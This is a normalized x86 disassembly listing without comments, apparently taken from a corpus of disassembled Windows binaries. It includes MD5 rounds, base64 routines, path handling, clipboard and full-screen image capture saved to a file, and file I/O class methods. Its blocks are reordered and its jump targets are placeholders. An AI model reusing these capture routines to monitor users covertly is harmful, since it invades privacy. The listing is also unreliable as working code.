lea edi [ edi + ecx - 0x3cc8f82a ]
mov ecx edi
shr ecx 0x17
shl edi 0x9
or ecx edi
add ecx esi
mov edi ecx
xor edi esi
and edi ebx
xor edi esi
add edi [ ebp - 0x34 ]
lea edx [ edx + edi - 0xb2af279 ]
mov edi edx
shr edi 0x12
shl edx 0xe
or edi edx
mov edx ecx
add edi ecx
xor edx edi
and edx esi
xor edx ecx
add edx [ ebp - 0x20 ]
lea ebx [ ebx + edx + 0x455a14ed ]
mov edx ebx
shl edx 0x14
shr ebx 0xc
or edx ebx
mov ebx edi
add edx edi
xor ebx edx
and ebx ecx
xor ebx edi
add ebx [ ebp - 0xc ]
lea esi [ esi + ebx - 0x561c16fb ]
mov ebx esi
shr ebx 0x1b
shl esi 0x5
or ebx esi
mov esi edx
add ebx edx
xor esi ebx
and esi edi
xor esi edx
add esi [ ebp - 0x38 ]
lea ecx [ ecx + esi - 0x3105c08 ]
mov esi ecx
shr esi 0x17
shl ecx 0x9
or esi ecx
add esi ebx
mov ecx esi
mov [ ebp + 0xc ] esi
xor ecx ebx
and ecx edx
xor ecx ebx
add ecx [ ebp - 0x24 ]
lea ecx [ edi + ecx + 0x676f02d9 ]
mov edi ecx
shr edi 0x12
shl ecx 0xe
or edi ecx
add edi esi
xor [ ebp + 0xc ] edi
mov ecx [ ebp + 0xc ]
and ecx ebx
xor ecx esi
add ecx [ ebp - 0x10 ]
lea edx [ edx + ecx - 0x72d5b376 ]
mov ecx edx
shl ecx 0x14
shr edx 0xc
or ecx edx
mov edx [ ebp + 0xc ]
add ecx edi
xor edx ecx
add edx [ ebp - 0x2c ]
lea ebx [ ebx + edx - 0x5c6be ]
mov edx ebx
shr edx 0x1c
shl ebx 0x4
or edx ebx
mov ebx edi
add edx ecx
xor ebx ecx
xor ebx edx
add ebx [ ebp - 0x20 ]
lea esi [ esi + ebx - 0x788e097f ]
mov ebx esi
shr ebx 0x15
shl esi 0xb
or ebx esi
add ebx edx
mov esi ebx
mov [ ebp + 0xc ] ebx
xor esi ecx
xor esi edx
add esi [ ebp - 0x14 ]
lea edi [ edi + esi + 0x6d9d6122 ]
mov esi edi
shr esi 0x10
shl edi 0x10
or esi edi
add esi ebx
xor [ ebp + 0xc ] esi
mov edi [ ebp + 0xc ]
xor edi edx
add edi [ ebp - 0x8 ]
lea edi [ ecx + edi - 0x21ac7f4 ]
mov ecx edi
shl ecx 0x17
shr edi 0x9
or ecx edi
mov edi [ ebp + 0xc ]
add ecx esi
xor edi ecx
add edi [ ebp - 0x3c ]
lea edi [ edx + edi - 0x5b4115bc ]
mov edx edi
shr edx 0x1c
shl edi 0x4
or edx edi
mov edi esi
add edx ecx
xor edi ecx
xor edi edx
add edi [ ebp - 0x30 ]
lea ebx [ ebx + edi + 0x4bdecfa9 ]
mov edi ebx
shr edi 0x15
shl ebx 0xb
or edi ebx
add edi edx
mov ebx edi
mov [ ebp + 0xc ] edi
xor ebx ecx
xor ebx edx
add ebx [ ebp - 0x24 ]
lea esi [ esi + ebx - 0x944b4a0 ]
mov ebx esi
shr ebx 0x10
shl esi 0x10
or ebx esi
add ebx edi
xor [ ebp + 0xc ] ebx
mov esi [ ebp + 0xc ]
xor esi edx
add esi [ ebp - 0x18 ]
lea esi [ ecx + esi - 0x41404390 ]
mov ecx esi
shl ecx 0x17
shr esi 0x9
or ecx esi
mov esi [ ebp + 0xc ]
add ecx ebx
xor esi ecx
add esi [ ebp - 0xc ]
lea esi [ edx + esi + 0x289b7ec6 ]
mov edx esi
shr edx 0x1c
shl esi 0x4
or edx esi
mov esi ebx
add edx ecx
xor esi ecx
xor esi edx
add esi [ ebp - 0x40 ]
lea edi [ edi + esi - 0x155ed806 ]
mov esi edi
shr esi 0x15
shl edi 0xb
or esi edi
add esi edx
mov edi esi
mov [ ebp + 0xc ] esi
xor edi ecx
xor edi edx
add edi [ ebp - 0x34 ]
lea ebx [ ebx + edi - 0x2b10cf7b ]
mov edi ebx
shr edi 0x10
shl ebx 0x10
or edi ebx
add edi esi
xor [ ebp + 0xc ] edi
mov ebx [ ebp + 0xc ]
xor ebx edx
add ebx [ ebp - 0x28 ]
lea ebx [ ecx + ebx + 0x4881d05 ]
mov ecx ebx
shl ecx 0x17
shr ebx 0x9
or ecx ebx
mov ebx [ ebp + 0xc ]
add ecx edi
xor ebx ecx
add ebx [ ebp - 0x1c ]
lea ebx [ edx + ebx - 0x262b2fc7 ]
mov edx ebx
shr edx 0x1c
shl ebx 0x4
or edx ebx
mov ebx edi
xor ebx ecx
add edx ecx
xor ebx edx
add ebx [ ebp - 0x10 ]
lea ebx [ esi + ebx - 0x1924661b ]
mov esi ebx
shr esi 0x15
shl ebx 0xb
or esi ebx
add esi edx
mov ebx esi
xor ebx ecx
xor ebx edx
add ebx [ ebp - 0x4 ]
lea ebx [ edi + ebx + 0x1fa27cf8 ]
mov edi ebx
shr edi 0x10
shl ebx 0x10
or edi ebx
mov ebx esi
add edi esi
xor ebx edi
xor ebx edx
add ebx [ ebp - 0x38 ]
lea ecx [ ecx + ebx - 0x3b53a99b ]
mov ebx ecx
shl ebx 0x17
shr ecx 0x9
or ebx ecx
mov ecx esi
add ebx edi
not ecx
or ecx ebx
xor ecx edi
add ecx [ ebp - 0x40 ]
lea edx [ edx + ecx - 0xbd6ddbc ]
mov ecx edx
shr ecx 0x1a
shl edx 0x6
or ecx edx
mov edx edi
add ecx ebx
not edx
or edx ecx
xor edx ebx
add edx [ ebp - 0x24 ]
lea esi [ esi + edx + 0x432aff97 ]
mov edx esi
shr edx 0x16
shl esi 0xa
or edx esi
mov esi ebx
add edx ecx
not esi
or esi edx
xor esi ecx
add esi [ ebp - 0x8 ]
lea edi [ edi + esi - 0x546bdc59 ]
mov esi edi
shr esi 0x11
shl edi 0xf
or esi edi
mov edi ecx
add esi edx
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x2c ]
lea ebx [ ebx + edi - 0x36c5fc7 ]
mov edi ebx
shl edi 0x15
shr ebx 0xb
or edi ebx
add edi esi
mov ebx edx
not ebx
or ebx edi
xor ebx esi
add ebx [ ebp - 0x10 ]
lea ebx [ ecx + ebx + 0x655b59c3 ]
mov ecx ebx
shl ebx 0x6
shr ecx 0x1a
or ecx ebx
mov ebx esi
not ebx
add ecx edi
or ebx ecx
xor ebx edi
add ebx [ ebp - 0x34 ]
lea ebx [ edx + ebx - 0x70f3336e ]
mov edx ebx
shl ebx 0xa
shr edx 0x16
or edx ebx
mov ebx edi
not ebx
add edx ecx
or ebx edx
xor ebx ecx
add ebx [ ebp - 0x18 ]
lea ebx [ esi + ebx - 0x100b83 ]
mov esi ebx
shl ebx 0xf
shr esi 0x11
or esi ebx
mov ebx ecx
add esi edx
not ebx
or ebx esi
xor ebx edx
add ebx [ ebp - 0x3c ]
lea ebx [ edi + ebx - 0x7a7ba22f ]
mov edi ebx
shl edi 0x15
shr ebx 0xb
or edi ebx
mov ebx edx
add edi esi
not ebx
or ebx edi
xor ebx esi
add ebx [ ebp - 0x20 ]
lea ebx [ ecx + ebx + 0x6fa87e4f ]
mov ecx ebx
shr ecx 0x1a
shl ebx 0x6
or ecx ebx
mov ebx esi
add ecx edi
not ebx
or ebx ecx
xor ebx edi
add ebx [ ebp - 0x4 ]
lea ebx [ edx + ebx - 0x1d31920 ]
mov edx ebx
shr edx 0x16
shl ebx 0xa
or edx ebx
mov ebx edi
add edx ecx
not ebx
or ebx edx
xor ebx ecx
add ebx [ ebp - 0x28 ]
lea ebx [ esi + ebx - 0x5cfebcec ]
mov esi ebx
shr esi 0x11
shl ebx 0xf
or esi ebx
mov ebx ecx
add esi edx
not ebx
or ebx esi
xor ebx edx
add ebx [ ebp - 0xc ]
lea ebx [ edi + ebx + 0x4e0811a1 ]
mov edi ebx
shl edi 0x15
shr ebx 0xb
or edi ebx
mov ebx edx
add edi esi
not ebx
or ebx edi
xor ebx esi
add ebx [ ebp - 0x30 ]
lea ebx [ ecx + ebx - 0x8ac817e ]
mov ecx ebx
shr ecx 0x1a
shl ebx 0x6
or ecx ebx
mov ebx esi
add ecx edi
not ebx
or ebx ecx
xor ebx edi
add ebx [ ebp - 0x14 ]
lea edx [ edx + ebx - 0x42c50dcb ]
mov ebx edx
shr ebx 0x16
shl edx 0xa
or ebx edx
mov edx edi
add ebx ecx
not edx
or edx ebx
xor edx ecx
add edx [ ebp - 0x38 ]
lea esi [ esi + edx + 0x2ad7d2bb ]
mov edx esi
shr edx 0x11
shl esi 0xf
or edx esi
mov esi ecx
add edx ebx
not esi
or esi edx
xor esi ebx
add esi [ ebp - 0x1c ]
lea edi [ edi + esi - 0x14792c6f ]
mov esi [ eax ]
add esi ecx
mov ecx edi
shl ecx 0x15
shr edi 0xb
or ecx edi
mov [ eax ] esi
add ecx [ eax + 0x4 ]
pop edi
pop esi
add ecx edx
mov [ eax + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
add edx ecx
mov ecx [ eax + 0xc ]
add ebx ecx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] ebx
pop ebx
leave
retn
sub_40c768
push esi
mov esi [ esp + 0xc ]
mov eax esi
push edi
shl eax 0x2
push 0x3
cdq
pop ecx
idiv ecx
add eax 0x4
push eax
call malloc
mov edi eax
push edi
push esi
push [ esp + 0x18 ]
call sub_40c797
add esp 0x10
mov eax edi
pop edi
pop esi
retn
sub_40c797
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
push 0x3
pop edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor edx edx
mov ecx edi
push ebx
div ecx
mov ecx eax
imul ecx ecx 0xfffffffd
add [ ebp + 0xc ] ecx
mov ecx [ ebp + 0x8 ]
and [ esi ] 0x0
mov eax esi
sub eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebp
retn
movzx eax [ ecx ]
mov edx [ rw-data ]
shr eax 0x2
cmp [ ebp + 0xc ] 0x1
mov al [ eax + edx ]
mov [ esi ] al
mov al [ ecx ]
jne r-xdata
movzx edx [ ecx ]
mov ebx [ rw-data ]
shr edx 0x2
mov dl [ edx + ebx ]
mov [ esi ] dl
mov dl [ ecx ]
movzx ebx [ ecx + 0x1 ]
and edx edi
add esi 0x4
shl edx 0x4
shr ebx 0x4
or edx ebx
mov ebx [ rw-data ]
mov dl [ edx + ebx ]
mov [ esi - 0x3 ] dl
mov dl [ ecx + 0x1 ]
movzx ebx [ ecx + 0x2 ]
and edx 0xf
shl edx 0x2
shr ebx 0x6
or edx ebx
mov ebx [ rw-data ]
mov dl [ edx + ebx ]
mov [ esi - 0x2 ] dl
mov dl [ ecx + 0x2 ]
mov ebx [ rw-data ]
and edx 0x3f
add ecx edi
dec eax
mov dl [ edx + ebx ]
mov [ esi - 0x1 ] dl
jne r-xdata
pop ebx
jmp r-xdata
movzx edx [ ecx + 0x1 ]
and eax edi
shl eax 0x4
shr edx 0x4
or eax edx
mov edx [ rw-data ]
mov al [ eax + edx ]
mov [ esi + 0x1 ] al
mov al [ ecx + 0x1 ]
mov ecx [ rw-data ]
and eax 0xf
mov al [ ecx + eax * 4 ]
mov [ esi + 0x2 ] al
mov ecx [ rw-data ]
and eax edi
shl eax 0x4
mov al [ eax + ecx ]
mov [ esi + 0x2 ] 0x3d
mov [ esi + 0x1 ] al
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ esi + 0x3 ] 0x3d
add esi 0x4
sub_40c89c
push esi
mov esi [ esp + 0xc ]
push edi
mov eax [ esi ]
inc eax
push eax
call malloc
mov edi eax
push edi
push [ esi ]
push [ esp + 0x18 ]
call sub_40c8c3
add esp 0x10
mov [ esi ] eax
mov eax edi
pop edi
pop esi
retn
sub_40c8c3
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
xor eax eax
xor edi edi
cmp [ ebp + 0xc ] eax
je r-xdata
and [ eax + esi ] 0x0
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
cmp cl 0x61
jb r-xdata
cmp cl 0x5a
ja r-xdata
cmp cl 0x30
jb r-xdata
cmp cl 0x7a
ja r-xdata
movzx ecx cl
sub ecx 0x41
jmp r-xdata
cmp cl 0x2b
jne r-xdata
cmp cl 0x39
ja r-xdata
movzx ecx cl
sub ecx 0x47
jmp r-xdata
mov edx edi
inc edi
sub edx 0x0
je r-xdata
cmp cl 0x2f
jne r-xdata
push 0x3e
jmp r-xdata
movzx ecx cl
add ecx 0x4
jmp r-xdata
shl cl 0x2
jmp r-xdata
dec edx
je r-xdata
cmp cl 0x3d
je r-xdata
push 0x3f
pop ecx
mov [ eax + esi ] cl
jmp r-xdata
mov edx ecx
sar edx 0x4
and dl 0x3
or [ eax + esi ] dl
inc eax
shl cl 0x4
dec edx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx ecx
sar edx 0x2
and dl 0xf
or [ eax + esi ] dl
inc eax
shl cl 0x6
jmp r-xdata
dec edx
jne r-xdata
mov cl [ ebx ]
dec [ ebp + 0xc ]
inc ebx
cmp cl 0x41
jb r-xdata
and cl 0x3f
or [ eax + esi ] cl
inc eax
xor edi edi
jmp r-xdata
sub_40c987
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
mov eax edi
inc eax
jmp r-xdata
cmp cl 0x9
jne r-xdata
mov cl [ eax ]
cmp cl 0x20
je r-xdata
push eax
push rw-data
push edi
call sprintf
push 0x2
lea eax [ edi + 0x1 ]
push rw-data
push eax
call strncmp
add esp 0x18
test eax eax
je r-xdata
push edi
call _strdup
pop ecx
test eax eax
jne r-xdata
mov ebp rw-data
push 0x1
push ebp
push edi
call strncmp
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x1
call exit
push [ rw-data ]
call strlen
push edi
mov esi eax
call strlen
lea esi [ esi + eax + 0x2 ]
push esi
call malloc
mov ebx eax
add esp 0xc
test ebx ebx
jne r-xdata
push esi
push 0x0
push ebx
call memset
push 0x1
push ebp
push [ rw-data ]
call strncmp
add esp 0x18
test eax eax
jne r-xdata
push 0x1
call exit
push edi
push [ rw-data ]
push rw-data
push [ rw-data ]
call strlen
cmp eax 0x1
pop ecx
jne r-xdata
push edi
push [ rw-data ]
push rw-data
jmp r-xdata
push esi
push ebx
call _snprintf
add esp 0x14
push ebx
call sub_40ca80
pop ecx
mov eax ebx
sub_40ca80
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ebx
mov dl [ ebx ]
test dl dl
je r-xdata
pop ebx
leave
retn
cmp dl 0x5c
je r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp + 0x8 ] eax
cmp dl 0x2f
je r-xdata
cmp dl 0x5c
je r-xdata
add [ ebp + 0x8 ] 0x2
cmp [ ebx + 0x1 ] 0x3a
lea eax [ ebx + 0x1 ]
jne r-xdata
test al al
je r-xdata
cmp dl 0x2f
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov cl [ ebx + 0x2 ]
cmp cl 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi eax
mov ecx eax
cmp al 0x5c
je r-xdata
mov al [ eax ]
cmp al 0x3a
jne r-xdata
cmp cl 0x2f
je r-xdata
inc ecx
jmp r-xdata
cmp dl 0x2f
jne r-xdata
inc [ ebp + 0x8 ]
cmp al 0x2f
jne r-xdata
mov dl [ ecx ]
cmp dl 0x5c
je r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
pop edi
cmp eax ebx
pop esi
jne r-xdata
cmp dl 0x2e
jne r-xdata
and [ eax ] 0x0
mov [ eax ] 0x2e
inc eax
cmp eax [ ebp + 0x8 ]
je r-xdata
mov dl [ ecx + 0x1 ]
lea esi [ ecx + 0x1 ]
test dl dl
je r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov [ eax ] 0x5c
inc eax
mov ecx esi
jmp r-xdata
cmp dl 0x5c
je r-xdata
cmp dl 0x5c
je r-xdata
cmp dl 0x2f
je r-xdata
cmp dl 0x2f
je r-xdata
cmp dl 0x2e
jne r-xdata
mov [ eax ] dl
inc eax
inc ecx
jmp r-xdata
mov dl [ ecx + 0x2 ]
lea esi [ ecx + 0x2 ]
test dl dl
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp dl 0x5c
je r-xdata
cmp eax edi
je r-xdata
cmp eax edi
jne r-xdata
cmp dl 0x2f
jne r-xdata
dec eax
cmp eax edi
jbe r-xdata
cmp eax [ ebp + 0x8 ]
je r-xdata
mov cl [ eax ]
cmp cl 0x5c
je r-xdata
mov [ eax ] 0x2e
inc eax
mov [ eax ] 0x2e
inc eax
mov edi eax
jmp r-xdata
mov [ eax ] 0x5c
inc eax
cmp cl 0x2f
jne r-xdata
sub_40cbb5
push esi
push 0x1a8
call ??2@YAPAXI@Z
test eax eax
pop ecx
je r-xdata
xor esi esi
push 0x0
mov ecx eax
call ??0CxImage@@QAE@K@Z
mov esi eax
jmp r-xdata
call [ EmptyClipboard@IAT ]
call [ CloseClipboard@IAT ]
mov al [ esp + 0xc ]
push 0x3
push [ esp + 0xc ]
mov ecx esi
mov [ esi + 0x154 ] al
call ?Save@CxImage@@QAE_NPBDK@Z
push esi
call [ DeleteObject@IAT ]
pop esi
retn
push 0x8
call [ GetClipboardData@IAT ]
test eax eax
je r-xdata
push 0x0
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
push eax
mov ecx esi
call ?CreateFromHANDLE@CxImage@@QAE_NPAX@Z
sub_40cc20
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
xor edi edi
push edi
push edi
push edi
push rw-data
call [ CreateDCA@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov esi [ GetDeviceCaps@IAT ]
push 0x8
push ebx
call esi
push 0xa
push ebx
mov [ ebp - 0xc ] eax
call esi
push 0xc
push ebx
mov [ ebp - 0x8 ] eax
call esi
cmp eax 0x8
mov [ ebp - 0x10 ] eax
ja r-xdata
xor esi esi
push 0x18
push ebx
call esi
mov esi 0x100
jmp r-xdata
mov eax [ ebp - 0xc ]
push edi
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x38 ] eax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x32 ] ax
lea eax [ ebp - 0x14 ]
push edi
push eax
lea eax [ ebp - 0x40 ]
push 0x1
push eax
push ebx
mov [ ebp - 0x40 ] 0x28
mov [ ebp - 0x34 ] 0x1
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
call [ CreateDIBSection@IAT ]
cmp eax edi
mov [ ebp - 0x10 ] eax
jne r-xdata
push ebx
call [ DeleteDC@IAT ]
jmp r-xdata
push ebx
call [ CreateCompatibleDC@IAT ]
cmp eax edi
mov [ ebp - 0x4 ] eax
jne r-xdata
mov esi [ ebp - 0x4 ]
push eax
push esi
call [ SelectObject@IAT ]
cmp eax edi
je r-xdata
mov esi [ DeleteDC@IAT ]
push ebx
call esi
push [ ebp - 0x4 ]
call esi
jmp r-xdata
mov edi [ DeleteDC@IAT ]
push ebx
call edi
push esi
call edi
cmp eax 0xffffffff
je r-xdata
push 0xcc0020
push edi
push edi
push ebx
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push edi
push edi
push esi
call [ BitBlt@IAT ]
test eax eax
je r-xdata
push 0x1a8
call ??2@YAPAXI@Z
cmp eax edi
pop ecx
je r-xdata
xor esi esi
push edi
mov ecx eax
call ??0CxImage@@QAE@K@Z
mov esi eax
jmp r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
jmp r-xdata
push edi
mov ecx esi
push [ ebp - 0x10 ]
call ?CreateFromHBITMAP@CxImage@@QAE_NPAUHBITMAP__@@PAUHPALETTE__@@@Z
mov al [ ebp + 0xc ]
push 0x3
push [ ebp + 0x8 ]
mov ecx esi
mov [ esi + 0x154 ] al
call ?Save@CxImage@@QAE_NPBDK@Z
push ebx
mov ebx [ DeleteDC@IAT ]
call ebx
push [ ebp - 0x4 ]
call ebx
push [ ebp - 0x10 ]
call [ DeleteObject@IAT ]
cmp esi edi
je r-xdata
??0CxFile@@QAE@XZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] CxFile::`vbtable'
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
??1CxFile@@UAE@XZ
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] CxFile::`vbtable'
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
?PutC@CxFile@@UAE_NE@Z
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov esi esp
push 0x1
push 0x1
lea eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x4 ]
call [ edx + 0xc ]
cmp esi esp
call _chkesp
mov [ ebp - 0x8 ] eax
xor eax eax
cmp [ ebp - 0x8 ] 0x1
sete al
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
??0CxFile@@QAE@ABV0@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] CxFile::`vbtable'
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
??4CxFile@@QAEAAV0@ABV0@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40ced0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
and eax 0x2
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
call ??1CxFile@@UAE@XZ
mov eax [ ebp + 0x8 ]
and eax 0x1
test eax eax
je r-xdata
push ??1CxFile@@UAE@XZ
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x4 ]
push edx
push 0x4
mov eax [ ebp - 0x4 ]
push eax
call sub_419250
mov ecx [ ebp + 0x8 ]
and ecx 0x1
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ ebp - 0x4 ]
sub eax 0x4
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x4
push edx
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
??0CxIOFile@@QAE@PAU_iobuf@@@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call ??0CxFile@@QAE@XZ
mov eax [ ebp - 0x4 ]
mov [ eax ] CxIOFile::`vbtable'
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] edx
xor eax eax
cmp [ ebp + 0x8 ] 0x0
sete al
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] al
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
??1CxIOFile@@UAE@XZ
push ebp
mov ebp esp
push 0xffffffff
push sub_434bb9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x50 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
mov [ eax ] CxIOFile::`vbtable'
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
call ?Close@CxIOFile@@UAE_NXZ
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
call ??1CxFile@@UAE@XZ
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x50
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
?Open@CxIOFile@@QAE_NPBD0@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esi esp
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ fopen@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x1
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
?Close@CxIOFile@@UAE_NXZ
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x48 ]
mov ecx 0x12
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x8 ] 0x0
sete al
pop edi
pop esi
pop ebx
add esp 0x48
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x8 ]
test edx edx
je r-xdata
mov esi esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
call [ fclose@IAT ]
add esp 0x4
cmp esi esp
call _chkesp
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x0
?Read@CxIOFile@@UAEIPAXII@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov esi esp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ fread@IAT ]
add esp 0x10
cmp esi esp
call _chkesp
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0xc
?Write@CxIOFile@@UAEIPBXII@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov esi esp
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call [ fwrite@IAT ]
add esp 0x10
cmp esi esp
call _chkesp
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0xc
?Seek@CxIOFile@@UAE_NJH@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov esi esp
